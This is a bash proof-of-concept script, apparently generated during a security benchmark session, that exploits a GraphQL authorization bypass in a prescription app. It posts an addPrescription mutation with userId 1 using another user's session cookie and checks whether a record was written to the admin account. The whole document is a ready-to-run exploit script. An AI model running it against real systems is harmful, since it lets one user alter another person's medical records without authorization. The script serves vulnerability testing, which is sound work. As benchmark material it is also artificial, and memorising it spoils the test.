#!/bin/bash
# POC: Demonstrates horizontal privilege escalation via addPrescription mutation - authenticated user adding prescriptions to admin account by manipulating userId parameter
# Target: ./repo
# Created: 2025-11-10T19:43:42.272Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# GraphQL addPrescription Authorization Bypass POC
# Demonstrates horizontal privilege escalation where authenticated user (userId: 2) 
# can add prescriptions to admin account (userId: 1) by manipulating userId parameter

TARGET_URL="${1:-http://localhost:5003/graphql}"
SESSION_COOKIE="${2:-session=}"

echo "[*] GraphQL addPrescription Authorization Bypass POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Attempt to add prescription to admin user (userId: 1) while authenticated as user 2
echo "[*] Attempting to add prescription to userId: 1 (admin) while authenticated as another user..."
echo ""

# Create properly formatted JSON payload
PAYLOAD=$(cat <<'EOF'
{
  "query": "mutation { addPrescription(userId: 1, prescriptionDetails: \"ESCALATION TEST: User2 writing to User1\") { prescription { id userId prescriptionDetails } } }"
}
EOF
)

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD")

echo "[*] Response:"
echo "$RESPONSE" | head -c 500
echo ""
echo ""

# Check if prescription was successfully created for userId: 1
if echo "$RESPONSE" | grep -q '"userId":1'; then
    echo "[+] SUCCESS: Prescription created for userId: 1 (admin account)"
    echo "[+] Authorization check FAILED - authenticated user was able to modify admin account"
    echo "[+] Vulnerability confirmed: Horizontal privilege escalation via userId parameter manipulation"
    
    # Extract and display the prescription ID
    if echo "$RESPONSE" | grep -q '"id"'; then
        PRESCRIPTION_ID=$(echo "$RESPONSE" | grep -oP '"id":\K[0-9]+' | head -1)
        echo "[+] Malicious prescription created with ID: $PRESCRIPTION_ID"
    fi
    
    exit 0
else
    echo "[-] FAILED: Could not add prescription to userId: 1"
    echo "[-] Response indicates:"
    if echo "$RESPONSE" | grep -q '"errors"'; then
        echo "    - Errors in response:"
        echo "$RESPONSE" | grep -o '"message":"[^"]*"'
    else
        echo "    - Unexpected response format"
    fi
    exit 1
fi